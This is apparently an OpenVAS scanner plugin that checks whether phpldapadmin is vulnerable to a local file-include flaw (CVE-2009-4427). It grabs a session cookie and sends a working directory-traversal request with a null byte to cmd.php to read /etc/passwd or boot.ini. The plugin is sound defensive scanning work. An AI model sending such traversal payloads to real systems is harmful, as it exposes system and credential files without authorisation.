###############################################################################
# OpenVAS Vulnerability Test
# $Id: phpldapadmin_37327.nasl 15 2013-10-27 12:49:54Z jan $
#
# phpldapadmin 'cmd.php' Local File Include Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "phpldapadmin is prone to a local file-include vulnerability because it
fails to sufficiently sanitize user-supplied data.

Exploiting this issue may allow an attacker to compromise the
application and the underlying system; other attacks are also
possible.

phpldapadmin 1.1.0.5 is vulnerable; other verisons may also be
affected.";


if (description)
{
 script_id(100396);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-12-15 19:11:56 +0100 (Tue, 15 Dec 2009)");
 script_cve_id("CVE-2009-4427");
 script_bugtraq_id(37327);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");

 script_name("phpldapadmin 'cmd.php' Local File Include Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/37327");
 script_xref(name : "URL" , value : "http://phpldapadmin.sourceforge.net/");

 script_description(desc);
 script_summary("Determine if phpldapadmin is prone to a local file-include vulnerability");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("phpldapadmin_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("phpldapadmin/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!version = get_kb_item(string("www/", port, "/phpldapadmin")))exit(0);
if(!matches = eregmatch(string:version, pattern:"^(.+) under (/.*)$"))exit(0);

dir = matches[2];
if(isnull(dir))exit(0);

  url = string(dir, "/index.php"); 
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
  if( buf == NULL )exit(0);

  c = eregmatch(pattern: "PLASESSID=([^;]+);", string: buf);
  if(isnull(c))exit(0);

  host = get_host_name();
  files = make_list("boot.ini","etc/passwd");

  foreach file (files) {
    req = string("GET ", dir,"/cmd.php?cmd=../../../../../../../../../",file,"%00 HTTP/1.1\r\nHost: ",
                  host, ":", port,"\r\nCookie: PLASESSID=", c[1],"\r\n\r\n");
    buf = http_keepalive_send_recv(port:port, data:req);
    if( buf == NULL )continue;

    if(egrep(pattern: "(root:.*:0:[01]:|\[boot loader\])", string: buf, icase: TRUE)) {
     
      security_hole(port:port);
      exit(0);

    }
  }
exit(0);